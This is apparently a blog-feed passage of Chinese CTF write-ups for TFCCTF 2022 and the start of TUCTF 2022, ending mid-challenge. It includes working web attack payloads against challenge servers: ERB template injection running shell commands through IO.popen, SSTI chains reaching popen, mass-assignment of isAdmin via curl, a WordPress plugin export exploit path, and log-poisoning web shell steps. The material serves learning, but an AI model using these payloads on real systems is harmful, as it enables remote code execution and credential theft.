<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207291935896.png?x-oss-process=hzy" alt="image-20220729193533364"></p>
<p>访问robots.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207291936215.png?x-oss-process=hzy" alt="image-20220729193616167"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207291936261.png?x-oss-process=hzy" alt="image-20220729193635214"></p>
<p>TFCCTF{Kr4ftw3rk_4nd_th3_r0b0ts}</p>
<h2 id="pong">PONG</h2>
<blockquote>
<p>Some random website that can ping hosts.</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207291937724.png?x-oss-process=hzy" alt="image-20220729193739676"></p>
<p>考虑使用分隔符执行多个命令</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207291939038.png?x-oss-process=hzy" alt="image-20220729193941983"></p>
<p>成功，直接找flagcat出来就行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207291940664.png?x-oss-process=hzy" alt="image-20220729194036616"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207291940714.png?x-oss-process=hzy" alt="image-20220729194049645"></p>
<p>TFCCTF{C0mm4nd_1nj3c5i0n_1s_E4sy}</p>
<h2 id="are-you-the-admin">ARE YOU THE ADMIN?</h2>
<blockquote>
<p>Do you have what it takes to be the admin?</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011231592.png?x-oss-process=hzy" alt="image-20220801123116527"></p>
<p>index.tsx源代码如下</p>
<pre><code class="hljs plaintext">import type &#123; GetServerSideProps, NextPage &#125; from &quot;next&quot;;
import type &#123; User &#125; from &quot;@prisma/client&quot;;
import &#123; prisma &#125; from &quot;../globals/prisma&quot;;
import &#123; useState &#125; from &quot;react&quot;;
import &#123; useRouter &#125; from &quot;next/router&quot;;

type Props = &#123;
  users: (User &amp;
    (
      | &#123;
          flag: string;
          isAdmin: true;
        &#125;
      | &#123;
          flag?: never;
          isAdmin: false;
        &#125;
    ))[];
&#125;;

const Home: NextPage&lt;Props&gt; = (&#123; users &#125;) =&gt; &#123;
  const [username, setUsername] = useState(&quot;&quot;);

  const router = useRouter();

  const create = async () =&gt; &#123;
    await fetch(&quot;/api/auth&quot;, &#123;
      headers: &#123;
        &quot;Content-Type&quot;: &quot;application/json&quot;,
      &#125;,
      method: &quot;POST&quot;,
      body: JSON.stringify(&#123;
        username,
      &#125;),
    &#125;);
    await router.replace(router.asPath);
  &#125;;

  return (
    &lt;div&gt;
      &lt;div&gt;Create user:&lt;/div&gt;
      &lt;input
        value=&#123;username&#125;
        onChange=&#123;(event) =&gt; setUsername(event.target.value)&#125;
      /&gt;
      &lt;button onClick=&#123;create&#125;&gt;Create&lt;/button&gt;
      &lt;div&gt;Users:&lt;/div&gt;
      &#123;users.map((user) =&gt; (
        &lt;div key=&#123;user.id&#125;&gt;
          &lt;div&gt;Username: &#123;user.username&#125;&lt;/div&gt;
          &lt;div&gt;Is admin? &#123;user.isAdmin ? &quot;yes&quot; : &quot;no&quot;&#125;&lt;/div&gt;
          &#123;user.isAdmin &amp;&amp; &lt;div&gt;&#123;user.flag&#125;&lt;/div&gt;&#125;
        &lt;/div&gt;
      ))&#125;
    &lt;/div&gt;
  );
&#125;;

export default Home;

export const getServerSideProps: GetServerSideProps&lt;Props&gt; = async (
  context
) =&gt; &#123;
  const users = (await prisma.user.findMany()) as Props[&quot;users&quot;];

  for (const user of users) &#123;
    if (user.isAdmin) &#123;
      user.flag = process.env.FLAG!;
    &#125;
  &#125;

  return &#123;
    props: &#123;
      users,
    &#125;,
  &#125;;
&#125;;
//主要功能是创建用户</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011233767.png?x-oss-process=hzy" alt="image-20220801123359706"></p>
<p>再看这个文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011300142.png?x-oss-process=hzy" alt="image-20220801130040083"></p>
<p>这个调用了sqlite DB，然后最后我们看到个格式化以下json有效负载并尝试创建管理员用户名，所以我们只需要自己写进去isadmin就可以了<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011312028.png?x-oss-process=hzy" alt="image-20220801131255957"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011314963.png?x-oss-process=hzy" alt="image-20220801131424894"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011315749.png?x-oss-process=hzy" alt="image-20220801131516706"></p>
<p>当然也可以直接用linux命令</p>
<pre><code class="hljs plaintext">curl -i -H &#x27;Content-Type: application/json&#x27; -d &#x27;&#123;&quot;username&quot;:&quot;huang&quot;,&quot;isAdmin&quot;:true&#125;&#x27; &#x27;http://01.linux.challenges.ctf.thefewchosen.com:49293/api/auth&#x27;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312116807.png?x-oss-process=hzy" alt="image-20220731211605753"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312109066.png?x-oss-process=hzy" alt="image-20220731210928710"></p>
<p>TFCCTF{S4n1t1z3_Y0ur_1nput5!}</p>
<h2 id="deeplinks">DEEPLINKS</h2>
<blockquote>
<p>My intern configured my iOS app and my website to handle deeplinks, but they didn’t tell me the path :( Can you help me find it?</p>
</blockquote>
<p>ios的一项新技术，deeplinking，了解一下</p>
<blockquote>
<p>适用于 iOS 和 Android 的深度链接是自定义网址，用于在移动应用程序中打开特定页面或事件</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312115093.png?x-oss-process=hzy" alt="image-20220731211522014"></p>
<p><a href="https://www.adjust.com/ja/glossary/deep-linking/">https://www.adjust.com/ja/glossary/deep-linking/</a></p>
<p><a href="https://stackoverflow.com/questions/48443050/how-do-i-find-an-apps-websites-deep-link">ios - How do I find an apps/websites Deep Link? - Stack Overflow</a></p>
<p><a href="https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html">App Search Programming Guide: Support Universal Links (apple.com)</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312114841.png?x-oss-process=hzy" alt="image-20220731211408744"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312149505.png?x-oss-process=hzy" alt="image-20220731214911417"></p>
<p>访问路径*/apple-app-site-association*，得到一个文件打开之后就能找到flag</p>
<pre><code class="hljs plaintext">&#123;
    &quot;applinks&quot;: &#123;
        &quot;apps&quot;: [],
        &quot;details&quot;: [
            &#123;
                &quot;appID&quot;: &quot;ABCDEFGHIJ.com.example.example&quot;,
                &quot;paths&quot;: [&quot;TFCCTF&#123;4ppl3_4pp_51t3_4550c14t10n&#125;&quot;]
            &#125;
        ]
    &#125;
&#125;</code></pre>
<p>TFCCTF{4ppl3_4pp_51t3_4550c14t10n}</p>
<blockquote>
<p>ps:扫目录也行</p>
</blockquote>
<h2 id="calendar">CALENDAR</h2>
<blockquote>
<p>Are online calendars trusty?<br>
Note: The website displays “Error establishing a database connection” at startup. Please wait ~10 seconds and refresh<br>
The flag is format :TFCCTF{FOUNDPASSWORD}</p>
</blockquote>
<p>wordpress漏洞，，打强网杯就遇到这个玩意了，麻了，出场率这么高</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312125929.png?x-oss-process=hzy" alt="image-20220731212537815"></p>
<p>这个题目描述说是日历问题，看一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312126965.png?x-oss-process=hzy" alt="image-20220731212607886"></p>
<p>有个留言框，但是测试之后貌似没啥用，然后考虑到可能是插件漏洞，ctrl+u走起来</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312127620.png?x-oss-process=hzy" alt="image-20220731212734560"></p>
<p>漂亮，5.16.2日历插件</p>
<p><a href="https://www.exploit-db.com/exploits/50084">https://www.exploit-db.com/exploits/50084</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312134496.png?x-oss-process=hzy" alt="image-20220731213445428"></p>
<p>直接利用这个poc就可以了</p>
<pre><code class="hljs plaintext">/wp-admin/admin.php?page=MEC-export&amp;mec-ix-action=export-events&amp;format=csv</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312135157.png?x-oss-process=hzy" alt="image-20220731213507092"></p>
<p>passwordwpne3mgfsnj8e8f6d</p>
<p>TFCCTF{wpne3mgfsnj8e8f6d}</p>
<p>此外还有一个未授权访问漏洞也是可以得到password的</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011149938.png?x-oss-process=hzy" alt="image-20220801114913564"></p>
<pre><code class="hljs plaintext">?page_id=2   // 参数直接改，试试能不能未授权</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011149075.png?x-oss-process=hzy" alt="image-20220801114952985"></p>
<p>继续走几个看看，到5的时候就是password</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011150447.png?x-oss-process=hzy" alt="image-20220801115029350"></p>
<h2 id="diamonds">DIAMONDS</h2>
<blockquote>
<p>Write something nice that passes our filter.</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011319521.png?x-oss-process=hzy" alt="image-20220801131925454"></p>
<p>过滤器来绕过他然后执行命令</p>
<p>看源码知道是ruby编写的</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011320721.png?x-oss-process=hzy" alt="image-20220801132045652"></p>
<p>fuzz测试了一下，是只能传0-9，a-z，A-Z</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011323048.png?x-oss-process=hzy" alt="image-20220801132323974"></p>
<p>正则表达式绕过姿势有很多，找了一下</p>
<p><a href="https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/">使用换行符绕过正则表达式检查 - David Hamann</a></p>
<p>所以使用%0a换行符绕过，成功<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011324176.png?x-oss-process=hzy" alt="image-20220801132407100"></p>
<pre><code class="hljs plaintext">&lt;%= IO.popen(&#x27;ls /&#x27;).readlines()  %&gt;
&lt;%= IO.popen(&#x27;ls -a ./&#x27;).readlines()  %&gt;
&lt;%= IO.popen(&#x27;cat ./flag.txt&#x27;).readlines()  %&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011329593.png?x-oss-process=hzy" alt="image-20220801132933516"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011329935.png?x-oss-process=hzy" alt="image-20220801132958869"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011330760.png?x-oss-process=hzy" alt="image-20220801133030685"></p>
<p>TFCCTF{02718f35dddc266e0ac40c0c0dcc98c34edd545678dc752ba9831b6d73bc706f}</p>
<h2 id="include-what-matters">INCLUDE WHAT MATTERS.</h2>
<blockquote>
<p>Flag Format : TFCCTF{}<br>
The flag file has a random name and it’s in a random location .</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011332609.png?x-oss-process=hzy" alt="image-20220801133235556"></p>
<p>目录穿越</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011333940.png?x-oss-process=hzy" alt="image-20220801133352871"></p>
<p>查看日志</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011334147.png?x-oss-process=hzy" alt="image-20220801133454063"></p>
<p>这个是考察日志攻击种马，bp抓包改UA</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011342234.png?x-oss-process=hzy" alt="image-20220801134212150"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011345471.png?x-oss-process=hzy" alt="image-20220801134522392"></p>
<p>种马成功，直接执行命令得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011346814.png?x-oss-process=hzy" alt="image-20220801134643742"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011347498.png?x-oss-process=hzy" alt="image-20220801134700423"></p>
<p>TFCCTF{LF1_1S_D4NG3R0US_4ND_L34DS_T0_RC3}</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="basic">BASIC</h2>
<blockquote>
<p>This guy keeps insulting my girlfriend! His last message confused me, though! Can you help me decode it?</p>
<p>/Rn/X7n#bUc.rjzh,|eEsg,?&amp;QI;@^ARm}UKOkICi#X.ixEmN]D</p>
</blockquote>
<p>base91解码得到flag</p>
<p>TFCCTF{sh3’s_4_10…_but_0n_th3_ph_sc4l3}</p>
<h2 id="mafioso">MAFIOSO</h2>
<blockquote>
<p>A soldier was walking around the streets of Sicily, late at night, with THE Consigliere. Same soldier, the very next day, found in a ditch with a note in his breast pocket. It read:</p>
<p>f433c3e883a1389482c0b652660580f36ea037434fd4a67d193bc1cdc9b2cc34</p>
<p>Flag format: TFCCTF{secret_message}</p>
</blockquote>
<p>不知道是啥加密，看样子应该就是在线解密就可以，真的感觉就是md5加密</p>
<p>在这里不由得感慨一下，国内的md5解密真的是不想说啥了，哈希解密真的是一个能用的都没，找了半天还是国外的，在这留一下，省的以后再找了</p>
<p><a href="https://crackstation.net/">CrackStation - 在线密码哈希破解 - MD5，SHA1，Linux，Rainbow Tables等。</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312154503.png?x-oss-process=hzy" alt="image-20220731215408414"></p>
<p>TFCCTF{ snitchesgetstitches}</p>
<h2 id="obscure">OBSCURE</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207292003032.png?x-oss-process=hzy" alt="image-20220729200312976"></p>
<p>纯纯考眼力的好吧,但是发现直接看的结果不对</p>
<p>TFCCTF{s3curlly_thr0ugh_0bscurlly}</p>
<p>然后f12大法提取出来flag了</p>
<pre><code class="hljs plaintext">T̶̨̧͈͍̥͚̭̜͇̻̥̘̹̝̩͍̦̜͕͉̥̳͑̎͋͊͛͗̆͐̄͂̀̒͛̉̿̏̈̕̚̚̕͝͝͝ͅF̶̡̛̛͖̝̹̹͔̟̝̟̠̩̲̱͉̻̭̻̮͓̲̮͈̜̅̔̈͐̀̾̋͊̈́͛͆̿̀̓͐̓͋̃͛̃́̑̀̽͂̋̌̐̎̕̕͘͝͠͝͝ͅC̵̢̨̨͓̞̥̠̲̗̝̯̥̥͚̙̰̣̼̻̤̳͓͙̺̤͊̍͊̌̍̎̀̅̽͊͘͘͘͜͝͠͝͝ͅÇ̶̼̫͎̬̰͓̰̭̺̼̥̮͖͗̾͐́̉͂͂͗̏̿̂̀͝͝Ṭ̷̛͓̑̓̓̒́̋̒̃̋͊̑̎͐͐̋̈̆̉́̀̏͑̀̾̎͒̾̉̃̄̊͂́͐̈́͘͘͜͝͝F̴̢̨̡̛̥̠̪̤̞͔̝̞̳̱̙̰̲̙̠̬̻̥̜͔̲̯͚̳̖̩̺͈̬͍̪̥̯͙̱͙͔̞̰̮̦̼̼͐͒͆̿̓̓͑̎͊̋͂͑̅̈́͗̃͆͊̓̆̈́͂́̆͌͂̈̔́̔̎̀̾̕̕̚͝͝͝͝͠ͅ&#123;̴̧̡̡̛͈̻̥̙̯̜͓̥̣͔̣͐̄̂̋͋̏͋̌̍̔̀̎̿̍̈́̐̏͒̓̒̉̐́̓̓̽̕̕͝͠s̴̝̬͒̾͗̌̓͊̚ͅ3̷̢̧͓̬̳̯̜̦͉̜̗͚̗̳̩̻͉͍̼͓͍̼͚̝͔͙̗̞͎͚̼͈̹̞͋̉̆̈́͊̐̓̔͋̈͂́̔̈́͒͗̀́̂̏͒͜͝ç̷̛͉͔̮̯̳͚̘̜͇̗͖̟̫̇͋̇̑͆̀͊̈̌̅̀̿̓͊̓̀̉́̀̓̋̊͐͊̒̌͒͒̈́̒̅̀̽̾͗̾͌̃̉̾̚̚̕̕͝͝ư̵̼̑̔͌̉͆͒̅͗̆̑̌̀̀͗̒̾̎͆̇̄̃̀̒̉̂͂̀̍̃̄̈͐̈́̔̔̈́̽̚͘̕͘ͅr̵̛̼͊̽̔̋͠1̶̧̡̨̡̢̧̡̛̗̼͓̣͖̖̖̫̲̻̰͇̫̘̖̞͖̬̤͔̙̠̪̦͙̮̝̫͔͕͈̗̙͇̫̩̫͔̩͂̾͆̈́̂̌͋̕͜͜ͅͅṭ̶̡̢̢̧̨̡̡̨̧̨̛͔̜̳̥̤̰̖̩̟̬̰̖̥̹̼͈̦̥̣͇̭͎̻̻͔̪͍̻̜͎͉͙͇̣̿̑̂̈́̇̉̄͑̅͂͐̒̽́̀̏̓̂͑͐͌̈̂̔͑̐͆̐̏͆́́̾̑̈́͑͌͐̓̊̕̚͘͜ͅẙ̸̢̨̛̹̻͉͇͎̭̻̙̭͔͎̺̤̤̻͓̼̮͈̤͈͈̠̞̪̠͉̗̺̟̙͈̖̲̪̫̖͔̟̟̇̇̿̎̊̀̊̔͌̀̀͒͐͋̀̍̃͒̂̈́͆͋̍͐̑̀̓̿̓̈́͑̊̇͆̿̓͐̓̉̕͘̕̕̚͜͠͝_̷̡̡̨̡̛̛̗̩͔̫̗̭̟̣̗͙͇͇̩̣̼̟̱͖̯̥͎̽͋́̽̈́̎͗̿͊͗͂̒̓͑͛̾̄̿͛̄͛͛́͌͐̀t̷̢̛̰̟̹͖̪̝͕̭̩͚̬̙̃͐̎͐͂͒͆̒̔̊̀͛̂̿̑̀̇͊͋̇̌̅͛̀͂͋̿̈́̈́̽̍̕͝͠͝ḩ̶̢̡̡̛̺͈̺̙͚̪͕͚̹̺̥͚̦͚̺̯̬̣͚͕͔̖̝̞̖͔̙͉͔̟̼͕͖̙̐̃͋̈͛̽́̔̈͐́́̒̏̂̄̊̔̿̍̀̓̅̽̆̍̐̌̈́̋̈́̀̿̓̐́̐͌̓͘̚͘͜͠͝͠͝ͅr̸̢̡͙̼̜̬̤̗̯̪͇̩͓͕͓͓̝͇͖̎͂̏͆͝ͅ0̷̨̛̛̛̛̯̖̞̮̦̞̫̜͕̱̻̞͎̯͎̮͑̿͆̀͛̔͆̈́̈̆̑̄̅͂̇̄́̀́̒̋̇̓̍̀̈́̂̈́̀̀̂̅̅̑́͌̋̈́͘̕̕̕̚͝ų̶̧̡̢̖͓̲̞̭̗̦̠̹̥̙̱̙̥̯̗̭̩͙͔̜̙̼̻̼̞͛̂͆̀̾̃̈́͑̈́̔̈́̾̉̄̌͗̀͊̔̈́̌́͜͠͝͠g̷̢̨̡̜̩̘̺͎̮̻̼͙̱̱͈̣̳̣̻̜͒̓͗̍͌̈́͌̉͑̽̕͝͝ͅh̸̛̛͓̯̣̼̫̦̐͗̀̾̉̅̑́͌̈́͌́͑̔̈́̇̄͘̕͝͝_̶̭̹̩̳̯͙̯͕͔̼̔̈͑̉͗͌̚͜͝0̵̢̧̛͎̭̣͈̼̳͍͚͖̲͚̗̮͖̲̼͍̼̮̖̩͖̫͔̱͓̥̯̹̥͎͖̳͈̻̝̬̪̙̪̩̬̀̉̽̂̑̓̓͐̂̐̉͆̇́̂͌̈́̏͆͗̒̋̅̋̚̕͜͜͜͝͠ͅḇ̵̨̡̨͍͖͔͚̰̠͚͇̤̝̦̺͎͙̱̭̥̼̹̞͓̜̙͕͕͚͍̩͈̭̱͖̍̌̇͆̄̏̃͌͆͛̑̀͑̂̅̍̔̐̾̽̓̑̈̇͑̃̉̎͂̐̅̆́͐̿͌͗̕͘̚̕͘̕̚͘͜͝͝͝ͅͅs̸̡̨̯̬̰̠̖̟̹͈̞͎͉͉͓̠̺̹̣̲̺̬̜̝͓͓̰͍̖̹̮̹̩̥̆̾̐͘ͅç̷̡̩͍̥̘̳̺͎͉͓͖̭̝̖̹̬̗̞̲̞̬̹̼̱̫͓͙̤̤̖̦͕͓̱̝̯͇̼͚͕̳̿͆̀͒͊̎̅͐̂͗̾̀͊͑͊́̊̈͒͂̾́͂̓̓̀̏͋͂̿̆̀͒̇̚͘͝͝ͅü̶̧̨̡̲̩̥͇̘͇̣͕̞̗͓̳̗͉̲͔̻̪̪͕̖͈̪̳̤̤͈̫̹͉̞̝͖͎͕̥̻̣̖̼̰̣̰̦̈̂̿̉̋̂̔̎̓͂̎̍̾̉͂̆̈͌̐͆̓̊͋͑͒̚͜͜͠͝͠͝͝ͅr̵̨̢̨̡̡͓̭͍̲̗͍̼̬̰̗̱̩̼̰̤͓̞̤͔͇͎̪̱̱̺͈̭͆͜ͅ1̶̡̧̨̛͕̟̹͚̹̫̮̖͚̯̲̰̤̙͉͌͆̈́̽̀͗̿̓̑͒̄̌̓̓̓͗̇̒̃̑̏̊͑̋̅̎̔͂͑̔͑̈̄̉̚͘͝ṭ̶̡̼̲͓̺̝̱̮͈̱͈͔̞̙͚̝̬̳͑͌͆̀̆̄͆̀͌͐̂̽̓̾͂̀́͗͗̍͒̆̏̓͌͒͌́̒̑̐́̃͘͝͝ẏ̸̨̡̨̞̰̜̜̟̦͎̣͍͎̳̝̮̼̦͚̮̖͈̺͓̮̲̤͙̞͕̰͖̩̭̮̯̆̌̊́̀̈́̈́̓̈́͛̌̈́́̄͋̍̇̍͌͑̃̀̈̐̋̄̐̈́̉͌̀̀̀͑̏͐̄́̿̅̽͊̉͘͘͜͝͝͠ͅͅ&#125;̴̨̧̡̨̛̛̞̝̼̫͈̝̞̣̣͈̥̫͙̻͓̯̮̻͇̤̦̼͍̱̥̞̥͔̙̹̲͈̲̥̤͚͚͕̺̫̗͍͖͎̆͗̍̈͠ͅͅ</code></pre>
<p>感谢腾讯，qq自动转义只留下了flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207292007077.png?x-oss-process=hzy" alt="image-20220729200743021"></p>
<p>所以最终flag为</p>
<p>TFCCTF{s3cur1ty_thr0ugh_0bscur1ty}</p>
<blockquote>
<p>ps:其实这是毛刺文字(Glitch Text Generator)，有专门的毛刺文字修复网站</p>
<p>[<a href="https://lingojam.com/GlitchTextGenerator">Glitch Text Generator― LingoJam</a>](<a href="https://lingojam.com/GlitchTextGenerator">https://lingojam.com/GlitchTextGenerator</a>)</p>
</blockquote>
<h1 id="forensics">FORENSICS</h1>
<h2 id="bbbbbbbbbb">BBBBBBBBBB</h2>
<blockquote>
<p>BBBBBBBBBB BBBBBBBBBB BBBBBBBBBB BBBBBBBBBB BBBBBBBBBB BBBBBBBBBB BBBBBBBBBB BBBBBBBBBB</p>
</blockquote>
<p>给个jpg附件，打不开，hex打开<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312146005.png?x-oss-process=hzy" alt="image-20220731214605921">，好多BBBBBBBBBB,暂时没啥思路</p>
<p>握草了，后来尝试了一下把BBBBBBBBBB全部删除，tmd，妥妥脑洞题</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207312146466.jpg?x-oss-process=hzy" alt="chall (1)"></p>
<p>TFCCTF{the_fI4g_1s_th4_w4y}</p>
<h1 id="reverse">REVERSE</h1>
<h2 id="source">SOURCE</h2>
<blockquote>
<p>My intern likes to hide things in apps, but they don’t give me the source code. What can I do?</p>
</blockquote>
<p>签到题，shift+f12就出了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011358577.png?x-oss-process=hzy" alt="image-20220801135810494"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011358868.png?x-oss-process=hzy" alt="image-20220801135820798"></p>
<p>TFC{3v3ryth1ng_1s_0p3n_5ourc3_1f_y0u try_h4rd_3n0ugh}</p>
<h1 id="pwn">pwn</h1>
<h2 id="random">RANDOM</h2>
<blockquote>
<p>I created a random number generator as a project. Unfortunately it only has one option, but I will add more soon (or not)!</p>
</blockquote>
<p>pwn签到题</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011400156.png?x-oss-process=hzy" alt="image-20220801140028072"></p>
<p>nc之后是这样</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011402997.png?x-oss-process=hzy" alt="image-20220801140219945"></p>
<p>分析一下main函数构造，可以发现输入一个数，然后先判断这个数和1是否相等，若相等就会随机打印一个数并输出</p>
<blockquote>
<p>rand ()函数是<strong>Excel中产生随机数的一个 随机函数</strong></p>
</blockquote>
<p>否则他就会判断是否等于1337，是的话就会打印出来flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208011405755.png?x-oss-process=hzy" alt="image-20220801140543689"></p>
<p>TFCCTF{Th3r3_w3r3_m0r3_0pt10n5_4ft3r_4ll!}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TUCTF 2022</title>
    <url>/2022/12/05/TUCTF%202022/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052134060.png?x-oss-process=hzy" alt="ctf"></p>
<span id="more"></span>
<p>TUCTF 2022</p>
<h1 id="web">Web</h1>
<h2 id="tornado">Tornado</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212051937845.png?x-oss-process=hzy" alt="image-20221205193744717"></p>
<p>考虑到是ssti漏洞，测试一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212051938520.png?x-oss-process=hzy" alt="image-20221205193823467"></p>
<p>直接读取config报错，试了好多其他payload也是报错</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212051939542.png?x-oss-process=hzy" alt="image-20221205193902483"></p>
<p>可以利用popen函数完成读取文件的目的，调用这个函数会返回一个文件的句柄，然后再配合read函数即可实现读取</p>
<p>该函数会执行fork一个子进程执行command这个命令，同时将紫禁城的标准输出通过管道连接到父进程，对于文件在父进程调用read函数读取即可。对于执行的命令会在父进程被执行</p>
<p>现在目的只有一个就是找到这个popen函数，由于想找的是一个子类，所以第一步就是找到其对象基类，也就是class ‘object’，方法就是使用__mro__属性来访问对象的继承类，但是目前没有对象所以先构造一个空字符串</p>
<p><em><code>&#123;&#123;“”.__class__.__mro__&#125;&#125;</code></em>,其中这个class用于返回调用的参数类型</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212051954366.png?x-oss-process=hzy" alt="image-20221205195431297"></p>
<p>可以看到该子类继承class’str’与class’object’并以一个元组返回，可以通过索引获得对象类名<code>&#123;&#123;"".__class__.__mro__[1]&#125;&#125;</code></p>
<p>紧接着列举所有继承自object的子类，通过对该对象调用subclasses方法</p>
<p><code>&#123;&#123;“”.__class__.__mro__[1].__subclasses__()&#125;&#125;</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212051958014.png?x-oss-process=hzy" alt="image-20221205195834866"></p>
<p>但是可以看到输出子类太多，可以切片查找，逐步定位</p>
<p><code>&#123;&#123;"".__class__.__mro__[1].__subclasses__()[230:]&#125;&#125;</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212051959410.png?x-oss-process=hzy" alt="image-20221205195946330"></p>
<p>从而确定popen函数位于233</p>
<p>这个时候使用该函数去调用执行命令</p>
<p><code>&#123;&#123;"".__class__.__mro__[1].__subclasses__()[233]("ls",shell=True,stdout=-1).communicate()&#125;&#125;</code></p>
<p>但是发现还是报错了，这条路走到这是死掉了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052003001.png?x-oss-process=hzy" alt="image-20221205200310946"></p>
<p>比赛结束后看老外的wp才知道原来我想复杂了，直接读app下的那个文件即可</p>
<p><code>&#123;&#123; open('/app/web2.py','r').read()&#125;&#125;</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052005639.png?x-oss-process=hzy" alt="image-20221205200539561"></p>
<p>TUCTF{t0rnad0_1snt_v3ry_s3cur3}</p>
<p>还有一个payload是有效负载可以正常使用</p>
<p><code>&#123;% import os %&#125;&#123;&#123;os.popen('ls').read()&#125;&#125;</code></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052039568.png?x-oss-process=hzy" alt="image-20221205203919510"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052040961.png?x-oss-process=hzy" alt="image-20221205204026918"></p>
<p>路径/parttwooftheproblem</p>
<p>cookie对应提示12957293 从而得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052042512.png?x-oss-process=hzy" alt="image-20221205204254454"></p>
<h2 id="hyper-maze">Hyper Maze</h2>
<blockquote>
<p>Welcome to my }HYPER{}MAZE{!</p>
<p>Try to find out way out of my evil maze! There is a gift waiting for you at the end!</p>
</blockquote>
<p>maze，是个迷宫题</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052046451.png?x-oss-process=hzy" alt="image-20221205204658391"></p>
<p>start之后就变成了这样</p>
